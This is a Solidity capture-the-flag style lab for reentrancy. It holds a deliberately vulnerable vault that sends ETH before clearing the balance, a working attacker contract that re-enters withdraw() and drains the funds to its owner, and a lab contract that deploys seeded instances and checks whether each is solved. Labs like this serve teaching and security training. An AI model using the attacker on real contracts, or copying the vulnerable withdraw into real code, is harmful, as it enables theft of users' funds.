// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {SolvableBase} from "@common/SolvableBase.sol";

/// @notice The classic CEI-violating vault. External call before state update,
///         so re-entering during the call returns the same balance forever.
contract VulnerableVault {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "no balance");

        // BAD: external call before state update.
        (bool ok,) = msg.sender.call{value: bal}("");
        require(ok, "transfer failed");

        balances[msg.sender] = 0;
    }

    receive() external payable {}
}

/// @notice Per-user attacker contract. Owned by the EOA that calls
///         `attack(...)` after `ReentrancyLab.createInstance()` deploys it.
///         Re-enters the vault from `receive()` while the vault still
///         shows the user's full deposit.
contract ReentrancyAttacker {
    VulnerableVault public immutable vault;
    address public immutable owner;
    uint256 public attackAmount;

    constructor(VulnerableVault v, address o) {
        vault = v;
        owner = o;
    }

    function attack() external payable {
        require(msg.sender == owner, "only owner");
        require(msg.value > 0, "bait > 0");
        attackAmount = msg.value;
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= attackAmount) {
            vault.withdraw();
        }
    }

    /// @notice Forward all stolen ETH back to the owner.
    function drain() external {
        require(msg.sender == owner, "only owner");
        (bool ok,) = payable(owner).call{value: address(this).balance}("");
        require(ok, "drain failed");
    }
}

/// @notice Multi-tenant reentrancy lab. Each user calls `createInstance()`
///         once; the lab deploys a fresh (vault, attacker) pair for them
///         and pre-seeds the vault with `SEED` ETH as the "victim funds".
///         The user then sends bait ETH to their attacker to trigger the
///         re-entrant drain.
///
///         The lab itself must hold enough ETH at deploy time to seed
///         every expected instance — see the funded `receive()`.
contract ReentrancyLab is SolvableBase {
    struct Instance {
        VulnerableVault vault;
        ReentrancyAttacker attacker;
    }

    uint256 public constant SEED = 10 ether;

    mapping(address => Instance) private _instances;

    event InstanceCreated(address indexed user, address vault, address attacker);

    receive() external payable {}

    function createInstance() external returns (address vault, address attacker) {
        require(address(_instances[msg.sender].vault) == address(0), "already created");
        require(address(this).balance >= SEED, "lab underfunded");

        VulnerableVault v = new VulnerableVault();
        ReentrancyAttacker a = new ReentrancyAttacker(v, msg.sender);

        // Lab itself becomes the "victim depositor" — pre-funds the vault.
        v.deposit{value: SEED}();

        _instances[msg.sender] = Instance(v, a);
        emit InstanceCreated(msg.sender, address(v), address(a));
        return (address(v), address(a));
    }

    function vaultOf(address user) external view returns (VulnerableVault) {
        return _instances[user].vault;
    }

    function attackerOf(address user) external view returns (ReentrancyAttacker) {
        return _instances[user].attacker;
    }

    function isSolved(address user) public view override returns (bool) {
        Instance memory inst = _instances[user];
        if (address(inst.vault) == address(0)) return false;
        return address(inst.vault).balance == 0 && address(inst.attacker).balance >= SEED;
    }
}
